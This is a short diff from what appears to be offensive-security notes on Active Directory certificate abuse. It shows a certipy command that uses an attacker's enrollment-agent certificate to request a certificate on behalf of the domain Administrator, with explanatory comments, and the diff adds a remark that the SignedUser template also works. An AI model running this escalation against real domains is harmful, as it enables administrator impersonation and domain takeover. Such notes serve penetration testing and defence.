@@ -42,9 +42,10 @@ certipy req \
     -ca 'LOL-CA' -template 'User' \
     -pfx 'attacker.pfx' -on-behalf-of 'LOL\Administrator'
 
-
+#### template can be also SignedUser
 
 # -template 'User': The target template that allows agent enrollment and issues authentication certificates.
+	#### template can be also SignedUser ###
 
 # -pfx 'attacker.pfx': Specifies the attacker's own certificate, which will be used as the enrollment agent certificate to sign the "on-behalf-of" request.
 
